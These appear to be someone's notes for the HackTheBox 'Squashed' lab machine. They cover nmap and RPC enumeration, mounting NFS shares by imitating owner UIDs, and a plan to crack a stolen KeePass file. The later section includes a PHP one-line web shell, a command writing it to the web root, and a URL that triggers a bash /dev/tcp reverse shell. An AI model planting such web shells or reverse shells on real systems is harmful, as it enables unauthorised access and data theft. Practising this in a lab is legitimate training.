# Squashed
export HTB_TARGET=10.10.11.191

---
### Sources:
1. https://vk9-sec.com/2049-tcp-nfs-enumeration/
2. https://gist.github.com/lgg/e6ccc6e212d18dd2ecd8a8c116fb1e45
3. https://github.com/patecm/cracking_keepass
4. https://medium.com/@m5kro/hashcat-vs-john-the-ripper-jtr-f207c34c5b1c

5. https://man7.org/linux/man-pages/man8/rpcbind.8.html
6. https://www.techtarget.com/searchenterprisedesktop/definition/Network-File-System
7. https://resources.infosecinstitute.com/topic/exploiting-nfs-share/
8. https://www.exploit-db.com/exploits/20025

9. https://miloserdov.org/?p=4961#14
10. https://github.com/epi052/feroxbuster

---
### Apps
- smbclient
- rpcbind
- nmap
- nfs-common

- hashcat
- john-the-ripper
- gobuster
- feroxbuster
(- grip -b <file>) // To visualize MD files from CLI

---
### Commands
##### NMAP
- nmap -sC -sV $HTB_TARGET

##### RPCBIND
- rpcinfo -p $HTB_TARGET
- rpcclient -p 2049 -I $HTB_TARGET

##### SAMBA
- mount -t nfs $HTB_TARGET:/<HOST_PATH> <CLIENT_PATH> -nolock

##### CREATING A SIMILAR HOST USER IN CLIENT
###### Check if user exist
- id <user>
###### Creating user with specific id
- sudo useradd -u <ID_OUT> -m -d <HOST_PATH> <user>
###### Check if user was created
- id <user>
###### Set user password
- sudo passwd <user>

##### NFS-COMMON
- showmount -e $HTB_TARGET
<Get shared folders information | Using the mount command to map these folders>



#####################################
---
Collected info
/home/ross (gid: 1001 id: 1001)
Get a kdbx file from /home/ross/Documents
/var/www/html (gid: 2017 id:???)

PHP Script to run commands received as parameters
'<?php\n  system($_REQUEST['cmd']);\n?>'

echo -e '<?php\n  system($_REQUEST['cmd']);\n?>' > htb.php
##### PHP Reverse Shell
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php


##### Reverse SHELL
http://squashed.htb/htb.php?cmd=bash -c 'bash -i >& /dev/tcp/<my_ip>/443 0>&1'

---
Next steps
Open and try to decrypt kdbx file


